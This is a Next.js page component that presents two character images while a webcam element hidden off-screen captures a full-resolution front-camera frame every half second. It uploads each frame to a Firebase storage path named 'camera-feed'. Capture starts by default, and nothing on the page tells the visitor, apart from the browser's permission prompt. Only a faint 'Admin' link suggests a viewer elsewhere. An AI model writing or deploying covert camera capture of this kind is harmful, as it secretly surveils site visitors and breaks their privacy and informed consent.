'use client';

import React, { useRef, useEffect, useState, useCallback } from 'react';
import Image from 'next/image';
import mainVisual01 from './assets/images/dammy01.png';
import mainVisual02 from './assets/images/dammy02.png';
import Link from 'next/link';
import dynamic from 'next/dynamic';
import type { WebcamProps } from 'react-webcam';
import type ReactWebcam from 'react-webcam';

import { storage } from '../lib/firebase';
import { ref, uploadString } from 'firebase/storage';

const Webcam = dynamic<Partial<WebcamProps> & React.RefAttributes<ReactWebcam>>(() => import('react-webcam').then((mod) => mod.default as unknown as React.ComponentType<Partial<WebcamProps> & React.RefAttributes<ReactWebcam>>), {
  ssr: false,
});

export default function Home() {
  const webcamRef = useRef<ReactWebcam>(null);
  const [isBroadcasting, setIsBroadcasting] = useState(true);

  const captureAndSend = useCallback(async () => {
    if (webcamRef.current && isBroadcasting) {
      const imageSrc = webcamRef.current.getScreenshot();
      if (imageSrc) {
        try {
          const storageRef = ref(storage, 'camera-feed/latest.jpg');
          // imageSrc is a base64 data URL (data:image/jpeg;base64,...)
          await uploadString(storageRef, imageSrc, 'data_url');
        } catch (error) {
          console.error("Failed to upload frame", error);
        }
      }
    }
  }, [isBroadcasting]);

  useEffect(() => {
    const interval = setInterval(captureAndSend, 500); // Send frame every 500ms
    return () => clearInterval(interval);
  }, [captureAndSend]);

  return (
    <main className="min-h-screen w-full flex flex-col bg-black relative">
      {/* Hidden Webcam - Moved off-screen to preserve render resolution */}
      <div className="fixed top-[-10000px] left-[-10000px]">
         <Webcam
            audio={false}
            ref={webcamRef}
            screenshotFormat="image/jpeg"
            screenshotQuality={1}
            width={1280}
            height={720}
            videoConstraints={{ 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }}
         />
      </div>

      <div className="w-full relative">
        <Image 
          src={mainVisual01} 
          alt="Character 01" 
          className="w-full h-auto block"
          priority 
        />
      </div>

      <div className="w-full relative">
        <Image 
          src={mainVisual02} 
          alt="Character 02" 
          className="w-full h-auto block" 
        />
      </div>
      
      {/* Admin Link - Overlay */}
      <div className="absolute bottom-4 right-4 z-10 opacity-50 hover:opacity-100">
        <Link href="/admin" className="text-white text-xs underline">
          Admin
        </Link>
      </div>
    </main>
  );
}
